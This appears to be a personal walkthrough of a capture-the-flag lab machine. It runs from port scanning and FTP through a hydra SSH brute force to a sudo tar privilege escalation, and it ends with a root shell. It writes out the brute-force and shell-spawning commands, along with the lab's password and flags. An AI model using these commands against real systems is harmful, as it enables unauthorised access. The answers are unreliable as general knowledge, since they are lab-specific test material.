saturday	-	12 june 2021

1.	port scanning (nmap)

2.	connect via ftp
	ftp://{MACHINE_IP}

3.	Q1 	->	lin

4.	Q2	->	ssh

5.	acquired list of potential passwords 

6.	use list to bruteforce ssh to machine for user named `lin`

7.	ssh passowrd bruteforce tool	->	`hydra` 

ERROR
---
```
while installing hydra, got an error: '[ERROR] Compiled without LIBSSH v0.4.x support, module is not
available!'

```

SOLN
---
*	stackoverflow link:	`https://stackoverflow.com/questions/39063170/error-compiled-without-libssh-v0-4-x-support-module-is-not-available`

*	commands to resolve:
	```sh
	brew uninstall hydra
	brew install -v --with-libssh hydra
	```

8.	bruteforce using:	
	`hydra -l lin -P /path/to/wordlist.txt {MACHINE_IP} ssh`

9.	Q3	->	passwd:		`RedDr4gonSynd1cat3`

10.	Q4	->	THM{CR1M3_SyNd1C4T3}

11.	let's see what commands user `lin` can use with **sudo**.

	*	`/bin/tar`
	->	https://gtfobins.github.io/gtfobins/tar/

	*	This is all we need to get root access. Therefore, command:
	```
	sudo tar -P -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
	```

12.	Now we have `root` shell, let's find **root.txt**
	
	```
	cat /root/root.txt 
	```

13.	Q5	->	`THM{80UN7Y_h4cK3r}`

